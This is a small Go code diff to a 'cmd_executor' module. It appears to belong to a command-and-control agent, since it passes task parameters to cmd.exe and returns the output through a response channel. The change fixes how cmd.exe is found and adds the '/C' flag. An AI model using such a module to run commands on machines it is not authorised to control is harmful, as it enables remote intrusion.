@@ -3,7 +3,6 @@ package cmd_executor
 import (
 	// Standard
 	"bytes"
-	"os"
 	"os/exec"
 	"strings"
 
@@ -17,13 +16,13 @@ func Run(task structs.Task) {
 	msg := structs.Response{}
 	msg.TaskID = task.TaskID
 	cmdBin := "cmd"
-	if _, err := os.Stat(cmdBin); err != nil {
+	if _, err := exec.LookPath(cmdBin); err != nil {
 			msg.SetError("Could not find cmd.exe")
 			task.Job.SendResponses <- msg
 			return
 	}
 
-	cmd := exec.Command(cmdBin)
+	cmd := exec.Command(cmdBin, "/C")
 	cmd.Stdin = strings.NewReader(task.Params)
 	var out bytes.Buffer
 	cmd.Stdout = &out
